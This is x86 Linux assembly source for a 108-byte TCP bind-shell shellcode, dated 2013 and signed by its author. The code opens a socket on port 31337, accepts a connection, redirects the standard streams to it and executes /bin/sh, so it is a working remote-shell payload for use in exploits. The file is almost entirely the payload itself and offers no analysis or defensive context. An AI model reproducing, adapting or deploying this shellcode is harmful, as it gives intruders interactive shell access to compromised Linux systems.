; Title   : tcpbindshell  (108 bytes)
; Date    : 15 May 2013
; Author  : Russell Willis <codinguy@gmail.com>
; Testd on: Linux/x86 (SMP Debian 3.2.41-2 i686)

BITS 32

global _start
section .text

_start:
	xor    eax,eax    ; clean eax
	xor    ebx,ebx    ; clean ebx
	xor    ecx,ecx    ; clean ecx
	xor    edx,edx    ; clean edx

socket:
	mov    al,0x66    ; syscall 0x66 -> socketcall()
	mov    bl,0x1     ; socket()
	push   ecx        ; useless
	push   0x6        ; IPPROTO_TCP = 0x06
	push   0x1        ; SOCK_STREAM = 0x01
	push   0x2        ; PF_INET     = 0x02
	mov    ecx,esp    ; save pointer to ecx
	int    0x80       ; syscall socket()

	mov    esi,eax    ; save fd to esi

bind:
	mov    al,0x66    ; syscall 0x66 -> socketcall()
	mov    bl,0x2     ; bind()
	push   edx        ; INADDR_ANY = 0x00
	push   0x697a     ; PORT = 31337
	push   bx         ; AF_INET = 0x02
	mov    ecx,esp    ; save pointer to ecx (struct)
	push   0x10       ; len(struct) = 0x10 (16 byte)
	push   ecx        ; the struct which is stored in ecx
	push   esi        ; push the sockfd to the stack
	mov    ecx,esp    ; save pointer to ecx
	int    0x80       ; syscall bind()

listen:
	mov    al,0x66    ; syscall 0x66 -> socketcall()
	mov    bl,0x4     ; listen()
	push   0x1        ; backlog = 0x1
	push   esi        ; push the sockfd to the stack
	mov    ecx,esp    ; save pointer to ecx
	int    0x80       ; syscall listen()

accept:
	mov    al,0x66    ; syscall 0x66 -> socketcall()
	mov    bl,0x5     ; accept()
	push   edx        ; len(struct) = NULL
	push   edx        ; struct = NULL
	push   esi        ; push the sockfd to the stack
	mov    ecx,esp    ; save pointer to ecx
	int    0x80       ; syscall accept()

	mov    ebx,eax    ; save return value from accept()
	xor    ecx,ecx    ; clean ecx
	mov    cl,0x3     ; ecx = 0x03 (STDIN, STDOUT, STDERR)
dupfd:
	dec    cl         ; decrement the counter
	mov    al,0x3f    ; syscall 0x3f
	int    0x80       ; syscall dup2()
	jne    dupfd      ; jump to dupfd

exec:
	xor    eax,eax    ; clean eax
	push   edx        ; push edx to the stack
	push   0x68732f6e ; 'hs/n'
	push   0x69622f2f ; 'ib//'
	mov    ebx,esp    ; save pointer to ebx
	push   edx        ; push edx to the stack
	push   ebx        ; push save pointer to stack
	mov    ecx,esp    ; save pointer to ecx
	push   edx        ; push edx to the stack
	mov    edx,esp    ; save pointer to edx
	mov    al,0xb     ; syscall 0xb = 11
	int    0x80       ; syscall execve
